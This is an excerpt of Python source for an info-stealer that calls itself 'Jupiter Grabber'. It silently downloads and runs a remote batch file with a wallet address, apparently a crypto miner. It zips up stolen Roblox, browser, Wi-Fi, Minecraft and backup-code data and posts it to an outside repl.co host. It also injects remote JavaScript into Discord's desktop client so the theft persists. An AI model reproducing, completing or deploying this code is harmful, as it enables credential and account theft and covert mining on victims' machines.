...
url = 'https://raw.githubusercontent.com/Dart2004/jupitergrabber/main/mine3.bat'
temp_file = tempfile.NamedTemporaryFile(delete=False).name + '.bat'
urllib.request.urlretrieve(url, temp_file)

# Run the batch file without displaying the console
DETACHED_PROCESS = 0x00000008  # Constant for hiding console in Windows
subprocess.Popen(temp_file + ' 44X9i4c6YhQcfLiSCrbNH25yrRfkrhrzQSeZT1meFsqtSq1K48XHXosdG4Bj9sLE7ceTbsCnL6k8LaiheZGFyfS6Nn2Hcer',
...
def main(webhook: str):
    ...
    data = {
        "username": "Jupiter Grabber",
        "avatar_url": "https://cdn.discordapp.com/icons/1086995812334178375/4afa120cbb5fff47631f73405a8f66f7.webp"
    }

    _file = f'{localappdata}\\jupiter-logged-{os.getlogin()}.zip'
    ...
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': ('jupiter-Logged.zip', file, 'application/zip')})
            requests.post("https://3b012674-c405-4db5-a89f-72c8a7bac3bf.id.repl.co", headers={'Content-type': encoder.content_type}, data=encoder)
    else:
        requests.post("https://3b012674-c405-4db5-a89f-72c8a7bac3bf.id.repl.co", json=data)
...
def zipup():
    _zipfile = os.path.join(localappdata, f'jupiter-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Jupiter Grabber"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/icons/1086995812334178375/4afa120cbb5fff47631f73405a8f66f7.webp"
                    }
                }
            ],
            "username": "Jupiter",
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('https://raw.githubusercontent.com/Dart2004/jupitergrabber/main/inject.js').text
        ...
        for dir in self.discord_dirs:
            ...
            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', "https://3b012674-c405-4db5-a89f-72c8a7bac3bf.id.repl.co"))
...
if __name__ == '__main__' and os.name == "nt":
    jupiter("https://3b012674-c405-4db5-a89f-72c8a7bac3bf.id.repl.co")
